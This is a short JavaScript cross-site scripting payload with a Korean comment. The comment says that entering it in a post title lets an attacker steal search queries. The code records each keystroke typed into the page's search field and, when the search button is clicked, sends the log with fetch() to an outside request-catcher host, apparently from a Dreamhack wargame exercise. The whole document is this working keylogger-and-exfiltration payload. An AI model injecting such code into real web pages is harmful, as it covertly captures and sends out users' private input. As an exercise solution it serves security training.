// 글 제목 부분에 Payload를 입력하면 검색어를 탈취할 수 있다.
const search_word = document.getElementsByName("search_word")[0];

var search_keylog = "";

search_word.addEventListener("keyup", (e) => {
    search_keylog += e.key;
});

const search_btn = document.getElementsByTagName("button")[0];

search_btn.addEventListener('click', () => {
    fetch("https://jperuml.request.dreamhack.games?k=" + search_keylog);
})
